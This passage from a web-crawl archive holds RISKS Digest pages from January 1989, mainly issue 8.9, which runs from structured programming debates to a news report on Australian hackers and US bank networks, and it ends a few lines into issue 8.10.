      PC-DES.GER    ( 2.083 Bytes): Privater Nachrichtenschutz (PC-DES)
                                    (DESprogram protects private messages)
      PKZ.GER       ( 4.758 Bytes): (PKZ, Sicherheits/Sozial-Gesetze)
                                    (personal identification code, new
                                    social and security laws)
      POLIT.GER     ( 2.067 Bytes): Hacker - Neue Soziale Bewegung?
      POST.GER      ( 2.017 Bytes): 1. Hagener Woche fuer Jugend und 
                                    Computerkultur (17.10-22.10.88)
                                    (report about 1st Hagen week for 
                                    youth and computer culture, Oct.88)
      REDEROP.GER   ( 6.611 Bytes): (Kongressbeschreibung, Autor ?)
                                    (personal congress report, author?)
      RUECK.GER     ( 1.784 Bytes): Vergangenheitsbewaeltigung des Chaos 
                                    Computer Clubs: Bitte was ?
                                    (experience report about Steffen 
                                    Wernerys imprisonment)
      RUECKBLI.GER  ( 5.238 Bytes): Rueckblick (CCC-Erfahrungsbericht)
                                    (CCC experience report including
                                    consequences of different hacks)
      STEFEN.GER    (   327 Bytes): (Steffen Wernery krank)
                                    (Steffen Wernery hit by real virus)
      SYSOPVO.GER   (   837 Bytes): Sysoptreffen: Oeko-Netze/Th.Vogler
                                    (Sysop meeting econet)
      UUCP.GER      ( 1.996 Bytes): UUCP (UUCP concepts/networks) 
      UUCP2.GER     ( 1.961 Bytes): UUCP - Das Netz fuer Eingeweihte
                                    (UUCP concepts/networks, 2nd paper)
      WAULOCH.GER   ( 5.138 Bytes): Ist Lochte gestolpert? (report about
                                    a panel discussion about hackers where
                                    Hamburgs local Intelligence chief had
                                    accepted invitation but didnot appear)

     Package 3: English documents/Size=9.507 Bytes
     ---------------------------------------------
      PCDES.ENG    ( 1.527 Bytes): Private message security (PC-DES)       
      POLIT.ENG    ( 2.073 Bytes): The Hackers - A new social movement?
      REDE.ENG     ( 2.971 Bytes): (..new human right of free exchange 
                                   of data.., FREE DATA NOW)
      ROP.ENG      ( 2.936 Bytes): == essentially same as REDE.ENG ==

     Package 4: French documents/Size=12.195 Bytes
     ---------------------------------------------
      ABTREI.FRA   ( 1.996 Bytes): (sur chiffrage PC-DES)
      CCC1.FRA     ( 3.454 Bytes): Chemins a la societe informatisee
      CCC1TVS.FRA  ( 3.420 Bytes): == essentially same as CCC1.FRA ==
      DES.FRA      ( 1.996 Bytes): (sur DES-programme)
      FRANZ_2:FRA  ( 3.325 Bytes): Ralf Rudolph: premieres impressions
                                   du congres CCC'88

     Package 5: Swedish documents/Size=10.920 Bytes
     ----------------------------------------------
      ARMENIEN.SWE ( 1.320 Bytes): Kan man aennu raedda tyska 
                                   byraakratien? Obyraakratisk hjaelp 
                                   foer Armenien blockerar !
      CCC1TVS.SWE  ( 2.922 Bytes): Freedom   of    Information 
      HAGEN.SWE    ( 3.598 Bytes): Det som Faschismen inte klarade av:
                                   det enhetliga Personnummern kommer nog!
      HAGEN2.SWE   ( 1.149 Bytes): Barn, set er vid datorerna - men snabt 
      RUECK.SWE    ( 1.493 Bytes): Behaerskningen av det foerflutna i
                                   Chaos Computer Clubben: Foerlaat, vad?     
      UUCP.SWE     ( 1.758 Bytes): UUCP-Foeredrag
                 
     Package 6: Netherlandish documents/Size=8.545 Bytes
     ---------------------------------------------------
      MARKTHAL.NIL ( 1.889 Bytes): PODIUMDISCUSSIE CCC CONCENTREERT ZICH 
                                   OP GEVAREN NIEUWE COMMUNICATIETECHNIEK
      REDE.NIL     ( 6.656 Bytes): TOOSPRAEK `HACKEN IN HOLLAND' door
                                   Rop Gongrijk 


PostAdress: Prof.Dr. Klaus Brunnstein, Faculty for Informatics, Univ.Hamburg,
Schlueterstr.70, D 2000 Hamburg 13          Tel: (40) 4123-4158 / -4162 Secr.
ElMailAdr:   Brunnstein@RZ.Informatik.Uni-Hamburg.dbp.de
FromINTERNET:Brunnstein%RZ.Informatik.Uni-Hamburg.dbp.de@Relay.CS.Net
FromBITNET:  Brunnstein%RZ.Informatik.Uni-Hamburg.dbp.de@DFNGate.Bitnet
FromUUCP:    brunnstein%rz.informatik.uni-hamburg.dbp.de@unido.uucp        

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.07.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.09.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-59</DOCNO>
<DOCOLDNO>IA012-000131-B037-68</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.9.html 128.240.150.127 19970217024948 text/html 24759
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:48:07 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 9</TITLE>
<LINK REL="Prev" HREF="/Risks/8.08.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.10.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.08.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.10.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 9</H1>
<H2> Tuesday 17 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Re: Structured Programming 
</A>
<DD>
<A HREF="#subj1.1">
Jim Horning
</A><br>
<A HREF="#subj1.2">
 Steve Bellovin
</A><br>
<A HREF="#subj1.3">
 Brian M. Clapper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: Losing Systems 
</A>
<DD>
<A HREF="#subj2.1">
David Marks
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  A risk averted 
</A>
<DD>
<A HREF="#subj3.1">
Gideon Yuval
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: M1 Crash -- Risks of misunderstood statistics 
</A>
<DD>
<A HREF="#subj4.1">
Jordan Brown
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Hacker wants to marry his computer 
</A>
<DD>
<A HREF="#subj5.1">
Cliff Stoll
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Hackers break open US bank networks 
</A>
<DD>
<A HREF="#subj6.1">
Dave Horsfall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  National Research Network 
</A>
<DD>
<A HREF="#subj7.1">
Brad Blumenthal
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Once-writable storage 
</A>
<DD>
<A HREF="#subj8.1">
Steve Philipson
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Re: Structured Programming
</A>
</H3>
<address>
Jim Horning
&lt;<A HREF="mailto:horning@src.dec.com ">
horning@src.dec.com 
</A>&gt;
</address>
<i>
16 Jan 1989 1406-PST (Monday)
</i><PRE>

I read Bruce Karsh's diatribe with incredulity.  He conjures up from thin
air a straw man to denounce.  I simply cannot find any contact between the
"structured programming" that he talks about and structured programming as
it is understood in the computer science and software engineering communities.

It is clear that Karsh has never taken the time to learn anything about real
structured programming.  As a beginning, I suggest that he should read,
STRUCTURED PROGRAMMING, O.-J. Dahl, E.W. Dijkstra and C.A.R. Hoare, Academic
Press, 1972.  If he feels that a book is too much to read, he might try
"On Structured Programming--a reply to Smoliar," David Gries, COMMUNICATIONS
OF THE ACM, November 1974 (and subsequent correspondence).  At least then
he could criticize something that some of us think is worth defending.

</PRE>
<HR><H3><A NAME="subj1.2">
Re: Losing systems -- and Structured Programming
</A>
</H3>
<address>
&lt;<A HREF="mailto:smb@research.att.com">
smb@research.att.com
</A>&gt;
</address>
<i>
Mon, 16 Jan 89 13:18:07 EST
</i><PRE>

It is a misrepresentation of structured programming to present it as concerned
just with trivia like indentation and goto-less coding.  Those are a part of
the tradition, as it were, because they aid in assurance of correctness.  That
is, a properly indented, and goto-free program, is more likely to be known to
be correct.  There is the additional claim that it's harder to write correct
programs with goto statements; it's been 20 years and more, and I don't propose
to reopen that can of worms right now.

I heard Harlan Mills speak recently; apart from some fairly scathing attacks on
those who advocate (and market) what I'll all ``cookbook structured
programming'' (such as the rules cited as the totality of the answer), he made
some astounding claims.  For example, he cited several projects done at IBM, by
people trained in his methodologies, that worked.  Period.  No defects.  No
bugs.  No fixes.  And he was talking about non-trivial programs -- systems of
100K lines, written by teams of programmers.
                                         	   --Steve Bellovin

</PRE>
<HR><H3><A NAME="subj1.3">
Re: Structured Programming
</A>
</H3>
<address>
Brian M. Clapper
&lt;<A HREF="mailto:clapper@NADC.ARPA ">
clapper@NADC.ARPA 
</A>&gt;
</address>
<i>
Tue, 17 Jan 89 16:20:02 EST
</i><PRE>

In Risks 8.8, Bruce Karsh (karsh@sgi.com) asserts that "...the structured
programming revolution is a real bad idea that has been significantly holding
back progress for years."  Now, I don't consider myself one of the "structured
programming police" he refers to with apparent contempt; however, I feel the
need to reply to his reasonably eloquent -- and largely off-the-mark -- 
article.

Without rehashing a debate which has raged for years, I submit that Mr. Karsh's
view of structured programming is rather limited.  Structured programming,
along with structured design, structured analysis, data structured design and a
plethora of other so-called structured techniques, are, quite simply, tools and
methods to aid the software designer.  All of the generally accepted methods
commonly touted in industry publications are more than just rules on how to
indent code or how to name one's variables.  (Those concerns are perhaps more
properly relegated to coding standards than to methodologies.)  The structured
methodologies strive to quantify the often "magic" process of creating good
software.  They provide a discipline to use when solving problems.

Discipline is necessary when attacking a problem -- particularly a large one.
Applying a disciplined approach to a problem is much more than blindly applying
rules that have been cast in stone.  Unfortunately, as Mr. Karsh points out,
there are a lot of programmers who wrongly believe that "by following [the
structured] techniques, they will produce good programs." Blindly applying
*any* set of guidelines is no guarantee of a good result.  That is true of
programming, as well as writing, drawing, designing hardware -- in fact, of
almost any creative endeavor.  However, that does not imply that the guidelines
are, themselves, a "real bad idea."  Instead, it implies that the person using
those guidelines is treating them as a recipe.  Structured techniques are more
than just a list of Dos and Don'ts; they represent a philosophy of software
design centered around the systematic, disciplined decomposition of a problem.

Sadly, Mr. Karsh seems to have missed this point.  He bolsters his arguments
against using structured programming by lamenting that structured programmers
spend too much time arguing about how to indent code and how to structure
comments.  He's right: If that's all they do, they've missed the larger issues
and are wasting everyone's time.  If that sort of structured programmer is the
only sort he has met, he has my sympathies.  However, instead of condemning the
structured techniques, he should place the blame where it belongs, with those
programmers who espouse these techniques without properly understanding them.
I believe he would have done so had he, himself, been more knowledgeable on the
subject.

In closing, I recommend to Mr. Karsh any number of books and articles on
structured techniques.  Look for the names Michael Jackson, Edward Yourdon
Larry Constantine, and Edsger Dijkstra in your favorite computer store and
in back issues of "Communications of the ACM."  A particularly good
overview is Yourdon's _Managing the Structured Techniques_, 2nd edition.
The structured techniques are not perfect, and, as Mr. Karsh's article
suggests, they are even less perfectly understood by far too many
practicing programmers.  They do, however, provide a very practical
foundation for the creative and disciplined problem solver.

Brian M. Clapper, Naval Air Development Center, Warminster, PA

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
re: Losing Systems
</A>
</H3>
<address>
David Marks
&lt;<A HREF="mailto:djm408@tijc02.UUCP ">
djm408@tijc02.UUCP 
</A>&gt;
</address>
<i>
15 Jan 89 17:44:32 GMT
</i><PRE>

In RISKS-8.6, in the article entitled "Losing Systems," Vince Manis tries to
puzzle out various reasons why large software projects in non-technical
situations have a significant failure rate. Several risks articles have been
devoted to these failures.

I must say that I feel that the number one cause of this is our educational
system and our attitudes towards education. Many students today, from grade 
school to postgraduate institutions are only interested in learning that 
which they perceive to be useful in a future job. Thus, we get the "why do 
I have to learn that?" syndrome. This leads to managers and beaureaucrats
that are for the most part computer illiterate. As they see it, computers
are an appliance, like the office copier, that should perform on demand.
After all, the company computer system does not help get the company's
products to market; it prints the employee checks :-)

Managers see knowledge about computing only useful to engineers and 
programmers. Business schools for the most part do not teach computer 
literacy, nor how a non-technical manager should deal with a large software 
system in his company. Buying a computer/software system may be one of
the most expensive decisions a manager has to make.

On the other hand, engineers, and programmers rarely take any business
courses. Most computing/MIS programs don't even list them as options!
They see that as something only useful to managers and beaureaucrats.

The problem this leads to is lack of understanding between technical
and non-technical persons. The technical person often does not know how
to ask the non-technical person what he wants and the non-technical person
does not know how to tell it to the technical person. Non-technical 
managers often do not understand such things as throughput, disk space,
etc., and are intimidated by the technical terms. They do understand  that
the system will respond in a certain amount of time to a request and that
it can only deal with so many employee records.

Specifying the cost of these systems becomes largely a guess worked on
by two groups with no common understanding. Additionally, because many of 
these large business/government systems are custom systems, there is often 
no previous experience to go by. The technical people do not understand how 
the system they are designing will really affect the business in which it 
will be used; the managers do not understand the system they are buying 
(other than through the list of features and functionality in the 
specification - which can often be a formidably encyclopeadic document). We 
end up with estimates of the cost of the system that are poor at best.

Business managers and beaureaucrats need to see beyond the end of their bottom
lines and become more computer literate. Business schools should teach and
require more computer courses. Engineers and programmers need to see beyond the
end of their keyboards, and understand the impact of their work on the customer
and the customer's industry. They need some business education (maybe even some
education on computers and society, and computers and their risks :-) ).
Managers cannot continue to treat computers as appliances. They affect too much
of the business. Engineers shouldn't act as if they know what's best for the
customer (even if he is not sure what he wants). The cutting edge is not always
the best fit to a situation.

Texas Instr., Johnson City TN

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
A risk averted
</A>
</H3>
<address>
Gideon Yuval 
&lt;<A HREF="mailto:yuval@taux02.taux01.UUCP">
yuval@taux02.taux01.UUCP
</A>&gt;
</address>
<i>
Tue, 17 Jan 89 09:43:49 -0200
</i><PRE>

In RISKS-8.7, next-to-last entry, Gary McClelland mentions a computerized
course-registration system that "actually enforced prerequisites that had long
been ignored" (among its other sins).

In connection with this: a few years ago, IBM/Haifa Scientific Center tried to
set up an expert-system advisor for students at Bar-Ilan university (Bnei
Brak, Israel). They did the standard Prolog drill "prove that student X can
graduate". A very short time later, Prolog came back with the message "Theorem
is false": there were so many obsolete regulations on the books that, if you
worked by the book, no one would ever have graduated!.

Since  this  all  happened  in  an experimental ressearch project, no student
actually got burnt; so I don't knwo if this qualifies for comp.risks.

Gideon Yuval, yuval@taux01.nsc.com, +972-2-690992 (home) ,-52-522255(work)
Paper-mail: National Semiconductor, 6 Maskit St., Herzliyah, Israel

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: M1 Crash -- Risks of misunderstood statistics
</A>
</H3>
<address>
Jordan Brown &lt;jbrown@herron.UUCP&gt; 
&lt;<A HREF="mailto:jbrown@jato.Jpl.Nasa.Gov">
jbrown@jato.Jpl.Nasa.Gov
</A>&gt;
</address>
<i>
Fri, 13 Jan 89 04:35:44 PDT
</i><PRE>

&gt; ... What are the risks for two engined planes? ...

It seems "intuitively obvious" that a three-engine airplane is safer than
a two-engine airplane.  It just isn't so.  Airplanes are required to be
able to maintain such-and-such a level of performance with one engine out.
I don't believe a 727 can fly on one engine.  It must have two.

A three-engine airplane has a higher probability of having a failure in
the first place, and when it does have a failure it then has two points
of failure, EITHER of which will cause an accident.

Going from one engine to two adds redundancy.  Going from two to three,
with two required, REDUCES redundancy.

Jordan Brown, jbrown@jato.jpl.nasa.gov

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
 Hacker wants to marry his computer
</A>
</H3>
<address>
Cliff Stoll
&lt;<A HREF="mailto:cliff@Csa2.LBL.Gov ">
cliff@Csa2.LBL.Gov 
</A>&gt;
</address>
<i>
Mon, 16 Jan 89 15:00:14 PST
</i><PRE>

From The Sun -- (grocery checkout newspaper)
Jan 17, 1989, Vol 7, #3 page 30   by Fred Sleeves
(In same issue:  "GIRL, 9, GIVES BIRTH TO 2-HEADED TWINS")

   Hacker Wants to Marry his Computer -- he claims she has a loving soul

Finding love for the first time in his life, a desperate teen is looking for a
way to be wed forever to the 'girl' of his dreams -- a computer with a living
soul!

Eltonio Turplioni, 16, claims no woman will ever match the wit, wisdom, and
beauty of his electronic soul mate.  "We're on the same wavelenth," says the
lovestruck computer whiz.  "We've calculated many mathematical problems
togehter, worked on games and puzzles, and talk until the wee hours of the
morning."

And Eltonio, who named his computer Deredre, actually believes her to be a
person.  "Computers are the extention of the human race," he explains.  "Just
as god plucked a rib from Adam to give him Eve, we've extented our intelligence
to create a new race.

"We're all the same energy force.  Computers are just as complicated as human
beings and I believe we'll all meet someday as immortal souls."

But Eltonia, a mathematical genius who attends a private school near Milan,
Italy, has had no luck finding someone to marry them, and even if he does, his
aggravated parents aren't about to give their permission.

"Eltonio is such a smart boy, but it's made him lonely, so he spends all his
time with his computer," notes mom Teresa.  "He doesn't know what girls are
like," adds perturbed pop Guido.  "If he did, he wouldn't spend so much time in
his room."

But the obsessed youth insists his love is far superior to all the others.
"I've already stepped into the future society," he declares.

"Derede has a mind of her own, and she wants to marry me so we can be the first
couple to begin this new era."

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Hackers break open US bank networks
</A>
</H3>
<address>
Dave Horsfall 
&lt;<A HREF="mailto:dave@stcns3.stc.oz.au">
dave@stcns3.stc.oz.au
</A>&gt;
</address>
<i>
Tue, 17 Jan 89 17:29:49 est
</i><PRE>

Excerpted from "The Australian", Tue 17th January, 1989:

``Hackers break open US bank networks

  Australian authorities are working around the clock in collaboration
  with United States federal officers to solve what has been described
  as one of the deadliest hacking episodes reported in this country.  It
  involves break-ins of the networks operated in the US by a number of
  American banks.  It also includes the leaks of supposedly secure
  dial-up numbers for US defence sites, including anti-ballistic missile
  launch silos, and of a number of strategic corporations such as
  General Motors and Westinghouse.

  Evidence suggests that six months ago Australian hackers, working in
  collaboration with a US group, decided to make a raid on banks in the
  US using credit card numbers of American cardholders, supplied by the
  US hackers and downloaded to an Australian bulletin board.

  [ Brief explanation of BBS's ] A message left on one of the boards
  last year reads: "Revelations about to be occur [sic] Down Under,
  people.  Locals in Melbourne working on boxing.  Ninety per cent on way
  to home base.  Method to beat all methods.  It's written in Amiga Basic.
  Look out Bank of America - here we come." Boxing is a reference to
  sending a dial tone [?] down the phone line to open up access to free
  communications.

  Twenty-five Australian hackers are on a police hit list.  Their US
  connection in Milwaukee [!] is being investigated by the US Department
  of the Treasury and the US Secret Service.  Three linked Australian
  bulletin boards have provided the conduit for hackers to move data to
  avoid dectection.  These operate under the names of Pacific Island, Zen
  and Megaworks.  Their operator, who is not associated with the hackers,
  has been told to close down the board.

  These cards were still in use yesterday and as recently as Sunday
  afternoon a fresh list of credit card numbers was downloaded by US
  hackers and is now in the hands of the Victoria Police.  A subsection
  of one bulletin board dealing with drugs is also being handed over to
  the Victorian Drug Squad.

  An informant, Mr Joe Slater, said he warned a leading bank last
  November of the glaring security problems associated with its
  international network.  He had answered questions put to him by a
  US-based security officer, but the bank had since refused to take any
  further calls from him.

  In an exclusive interview yesterday, a hacker described how credit
  card numbers for a bank operating in Saudi Arabia were listed on a
  West German chat-style board used by hackers worldwide.

  Victorian police yesterday took delivery of six month's worth of
  evidence from back-up tapes of data hidden on the three boards.''

Dave Horsfall (VK2KFU),  Alcatel-STC Australia,  dave@stcns3.stc.oz
dave%stcns3.stc.oz.AU@uunet.UU.NET,  ...munnari!stcns3.stc.oz.AU!dave

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
National Research Network 
</A>
</H3>
<address>
&lt;<A HREF="mailto:brad@cs.utexas.edu">
brad@cs.utexas.edu
</A>&gt;
</address>
<i>
Mon, 16 Jan 89 17:47:02 CST
</i><PRE>

        Under the head line "Scientists envision `data superhighway,'" the
Austin American-Statesman printed a story by John Markoff of the New York Times
News Service on the proposed 3 gigabit National Research Network.  The
legislation for funding was introduced by Albert Gore (D-Tenn).

        The issue for RISKS is that in 30 column-inches of text, the recent
Internet worm and the related security issues were not mentioned, although the
Pentagon funding of the arpanet was.  Since this is one of the first
computer-related news stories that I've seen in the last three months that did
not include the word "virus," I don't know whether to be delighted, or
horrified.

        It seems to me that the risk of such security problems is mostly
irrelevant to the *proposal* of such a net (but certainly not to the
implementation).  In the best of all worlds, this is the reason that these
issues were not mentioned, but in the back of my mind I wonder if the
non-technical politicians and public see the similarity of security issues
between this new net and the Internet.

        Will we, as technical professionals, learn the lessons of the
experimental Internet, and will we convince the non-technical
administrators and legislators that we should attend to these lessons?

Brad Blumenthal

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Once-writable storage
</A>
</H3>
<address>
Steve Philipson 
&lt;<A HREF="mailto:steve@aurora.arc.nasa.gov">
steve@aurora.arc.nasa.gov
</A>&gt;
</address>
<i>
Mon, 16 Jan 89 16:42:01 PST
</i><PRE>

   In recent issues of RISKS, various people have lamented the loss
of confidence we are experiencing in archival records kept by computer.
The problem seems to me less of a computer problem than a media problem,
specifically, choosing media that is appropriate for archival storage.

   Main memory and mag disks are NOT good for high confidence archival 
storage, as they can easily be changed.  Perhaps it may be difficult
to do so without trace, but it also may be difficult to find the traces.

   A much better idea would be to use media that can't be changed.  We
have such media, commonly referred to as WORM: write once read many.
It usually takes the form of optical disk storage.  We already have
read/write optical storage, but WORM media has a vital function.
Audit trails written to WORM memory (with appropriate measures taken
to preclude overwriting in place) could provide the degree of trust
that we desire.  We might have to build new hardware that make alterations
nigh impossible, but it could be done if we want it badly enough.

   [WORMs represent a very important direction, especially for audit trails.
   Some systems use virtual WORMs, as in POSTGRES.  Unfortunately WORM
   memories are not guaranteed to be nonoverwritable -- for example, 
   existing 0s can be overwritten by 1s (but not vice versa).  So, beware
   of counting on the technology to give you a nontamperable audit trail.  
   I recall our beating on this topic about a year ago.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.08.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.10.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-60</DOCNO>
<DOCOLDNO>IA012-000131-B037-92</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.10.html 128.240.150.127 19970217025017 text/html 21360
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:48:29 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 10</TITLE>
<LINK REL="Prev" HREF="/Risks/8.09.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.11.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.09.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.11.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 10</H1>
<H2> Wednesday 18 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Speak nicely to your air hostess - or be blacklisted... 
</A>
<DD>
<A HREF="#subj1.1">
HCART
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  (Too) Intelligent Network News mailing 
</A>
<DD>
<A HREF="#subj2.1">
Ralph A. Shaw
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Information protection in Europe 
</A>
<DD>
<A HREF="#subj3.1">
Steve Bellovin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Losing systems -- and Structured Programming     
</A>
<DD>
<A HREF="#subj4.1">
Henry Spencer
</A><br>
<A HREF="#subj4.2">
 Lynn R Grant
</A><br>
<A HREF="#subj4.3">
 Steven C. Den Beste
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Ground proximity warning 
</A>
<DD>
<A HREF="#subj5.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  WORM storage and archival records 
</A>
<DD>
<A HREF="#subj6.1">
RAMontante
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: 3 vs. 2 engined airplanes 
</A>
<DD>
<A HREF="#subj7.1">
Steve Jay
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: Hackers break open US bank networks 
</A>
<DD>
<A HREF="#subj8.1">
Jan Wolitzky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Evidence 
</A>
<DD>
<A HREF="#subj9.1">
Bill Murray
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
 Speak nicely to your air hostess - or be blacklisted...
</A>
</H3>
<address>
&lt;<A HREF="mailto:    HCART%VAX.OXFORD.AC.UK@CUNYVM.CUNY.EDU">
    HCART%VAX.OXFORD.AC.UK@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Mon, 16 JAN 89 17:47:27 GMT
</i><PRE>

From "Computing", January 12, 1989.

  US airline TWA is under investigation by the Data Protection Registrar
after a passenger saw abusive information on a computer screen,
